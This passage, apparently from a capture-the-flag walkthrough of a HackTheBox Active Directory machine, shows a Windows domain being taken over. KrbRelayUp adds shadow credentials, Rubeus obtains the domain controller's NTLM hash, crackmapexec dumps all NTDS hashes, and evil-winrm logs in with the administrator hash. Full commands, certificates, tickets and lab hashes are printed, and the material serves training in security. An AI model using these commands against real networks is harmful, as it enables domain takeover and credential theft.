ZQBkACAAUgBTAEEAIABhAG4AZAAgAEEARQBTACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcjCCA88GCSqGSIb3DQEHBqCCA8AwggO8AgEAMIIDtQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIkjItP1DeuG8CAgfQgIIDiNezmZTEMNZMb+LqXs3B1twV1hNrLnz2ipeHzR6p/OEi+KMopJB8hIZ+w7RxepJVVfZVXgJhbzR+pfLBsYV5OxjcUCA7UfU5gRAEBtgfslEunY5IWCNl5EUjP8I+RKgkF/Rt/S+fHIfvVU4BXk3bLWbR1Rnr74FSd94ZXWkBb0CI6yP2z1xYW/ZNK6UoIyLx+hPk3vmAeiE1Hekp9eNx8Xn0b9B+aCgEI8Ewxu/8+oYhAqbQdn4bnHvfHCJ0o/Kf66StPqOnfSCEG/aAxbrbpllA7sc3C6osqhKt9hrhMTRHmOs2glroqUN9VYCVc3dZ+Wrl25xrl0dxR/3oDY1UOwSh65o57iaSqswdBJ2QRb99UBald5CWG07cVmU4YS4gKgHYqMOQKJh24w07oA+xGscdKSGGmBnJ6jOhisjPN7HRNirYxL1vVhPWoafQ0QJopP5zbCbrkzmcBuKrf+TjMABK3/jxvzi5DbLHU6A0rM8fvo3TaNKG32AbB8g2IEqz9tgLcYFqny8ui5GwOoiwoTbcHy3rvg12llSGqiGWPk+Rqn3salbM6OBp/EMfFIGSwIMMRDPzH34yzlQSTJogWx6/xdPEubLmFs5jhqUbBbQMdnvERTV69VyRqOUNKMohgf+6mLxnQ/l7IIz0g0OKJubluqaxkPSoVDNvSBumwivbMmx4FEoYUxf+OP/iRyg10/9IVYInF4iPB87NR9T66tTjucOxvWRXyMMPSP8rEGGBK13xzUuezHDLniH2KGNeu42hDoiB0lnrryLOp7z90x4bMuvfa/49Owci3pEnt/rsW3G/6yJKBDPcVuPF8VBGVKJtQyfTaAxJ2Nc2IfJArIjkxkMuex/7TSai4fng7/6eD6Zh8ejAihrRlUPJLrwGZhbUGla7UAKlNv5TW9uie0R9qv9km8RiV/XWvcMSayjXm597V8ebO+q+5KE9qBRG1hKBnxyNvkX9DOEi+KL5DkAsJ/dytIq5CMOjrBj4S6M1p9Q8W2LUcuLYCZ+/d76zaf+yOUmb8ltQE8rFWUaNsokS+5Eef6o30qp8KckFG1mPjfPdGJEsqCBlEE+F8PVzrvTFu6mH1IbXymZM++CmDGGavZPIEkt4IPp1JvR+lHKA/LP3WoBs1AsdL8AeN8IjQ9/jS1ci8nb9xRFyvxii/AXmUE1FuBv8keAyEoHeCl+2oci+YKmkhGowOzAfMAcGBSsOAwIaBBQVAiQ80+5FQZ5/iIyEV/6QS6DOngQUNiC7PGq784Sf0KKLfx5pBRYJRWACAgfQ -cep yJ6$nT9#bY3-
```

However, running that command doesn’t work. That’s because it’s trying to spawn a shell, and something is blocking it.

#### Success

I’ll run this again and look at the output:

```
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 ".\KrbRelayUp.exe relay -m shadowcred -cls {354ff91b-5e49-4bdc-a8e6-1cb6c6877182}"

KrbRelayUp - Relaying you to SYSTEM

[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] Generating certificate
[+] Certificate generated
[+] Generating KeyCredential
[+] KeyCredential generated with DeviceID 8f7faad1-be9d-45cb-a829-6d9b40414c13
[+] KeyCredential added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp.exe spawn -m shadowcred -d absolute.htb -dc dc.absolute.htb -ce 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 -cep tW6@oE8=tX0@
```

It’s asking me to run KrbRelayUp.exe spawn with the following parameters, which I can figure out with the help and/or GitHub README:

```
KrbRelayUp.exe spawn
```

- -m shadowcred - abusing shadow creds

```
-m shadowcred
```

- -d absolute.htb - domain to target

```
-d absolute.htb
```

- -dc dc.absolute.htb - domain controller

```
-dc dc.absolute.htb
```

- -ce MIIKQAIBAz... - base64-encoded certificate

```
-ce MIIKQAIBAz...
```

- -cep tW6@oE8=tX0@ - password for the certificate

```
-cep tW6@oE8=tX0@
```

KrbRelayUp is reporting that it successfully ran the attack, and created shadow creds for the computer account. If that’s the case, I can try to use this certificate / password in a different way. I’ll grab a copy of Rubeus (from Sharp Collection ) and upload it. I’ll use the asktgt command with the following options:

```
KrbRelayUp
```

```
asktgt
```

- /user:DC$ - user is the machine account

```
/user:DC$
```

- /certificate:MIIKQAIBAz... - certificate for the shadow credential

```
/certificate:MIIKQAIBAz...
```

- /password:"tW6@oE8=tX0@" - password from the shadow credential

```
/password:"tW6@oE8=tX0@"
```

- /getcredentials - use this TGT to request a U@U service ticket and the account NT hash

```
/getcredentials
```

- /show - show the results

```
/show
```

- /nowrap - don’t wrap output

```
/nowrap
```

```
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:DC$ /certificate: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 /password:"tW6@oE8=tX0@" /getcredentials /show /nowrap
    

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN="CN=DC", OU=Domain Controllers, DC=absolute, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\DC$'
[*] Using domain controller: fe80::909e:3a4b:ad01:d7d7%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
      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

  ServiceName              :  krbtgt/absolute.htb
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  DC$
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  5/23/2023 9:35:36 PM
  EndTime                  :  5/24/2023 7:35:36 AM
  RenewTill                :  5/30/2023 9:35:36 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  HsqwfKfaqxHXEEWrTrZgNQ==
  ASREP (key)              :  B12C01DBB616E818DD73E1A922CC245A

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A7864AB463177ACB9AEC553F18F42577
```

The NTLM hash at the bottom is for the computer account.

#### DC Sync

All the accounts I’ve interacted with so far have been in the Protected Users group , which is what has prevented NTLM authentication.

![image-20230526063508856](/img/image-20230526063508856.png)
The machine account is not in that group, and thus I can use this recovered NTLM hash to authenticate.

I’ve shown using an admin hash with secretsdump.py many times before. The DC machine account is also authorized to do this, and it can also be done with crackmapexec :

```
secretsdump.py
```

```
crackmapexec
```

```
oxdf@hacky$ crackmapexec smb -dc-ip dc.absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds

SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:c-ip) (signing:True) (SMBv1:False)
SMB         dc.absolute.htb 445    DC               [+] c-ip\DC$:A7864AB463177ACB9AEC553F18F42577 
SMB         dc.absolute.htb 445    DC               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         dc.absolute.htb 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc.absolute.htb 445    DC               Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::
SMB         dc.absolute.htb 445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         dc.absolute.htb 445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::
SMB         dc.absolute.htb 445    DC               J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::
SMB         dc.absolute.htb 445    DC               M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::
SMB         dc.absolute.htb 445    DC               D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::
SMB         dc.absolute.htb 445    DC               s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::
SMB         dc.absolute.htb 445    DC               j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::
SMB         dc.absolute.htb 445    DC               n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::
SMB         dc.absolute.htb 445    DC               m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::
SMB         dc.absolute.htb 445    DC               l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::
SMB         dc.absolute.htb 445    DC               c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::
SMB         dc.absolute.htb 445    DC               s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::
SMB         dc.absolute.htb 445    DC               d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::
SMB         dc.absolute.htb 445    DC               svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::
SMB         dc.absolute.htb 445    DC               svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::
SMB         dc.absolute.htb 445    DC               winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::
SMB         dc.absolute.htb 445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::
SMB         dc.absolute.htb 445    DC               [+] Dumped 18 NTDS hashes to /home/oxdf/.cme/logs/DC_dc.absolute.htb_2023-05-24_002225.ntds of which 17 were added to the database
SMB         dc.absolute.htb 445    DC               [*] To extract only enabled accounts from the output file, run the following command: 
SMB         dc.absolute.htb 445    DC               [*] cat /home/oxdf/.cme/logs/DC_dc.absolute.htb_2023-05-24_002225.ntds | grep -iv disabled | cut -d ':' -f1
```

#### Evil-WinRM

From my shell as winrm_user, it’s clear that administrator is also not in the Protected Users group:

![image-20230526064424415](/img/image-20230526064424415.png)
The NTLM hash for administrator can be used to get a shell as administrator:

```
oxdf@hacky$ evil-winrm -i 10.10.11.181 -u administrator -H 1f4a6093623653f6488d5aa24c75f2ea

Evil-WinRM shell v3.4

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```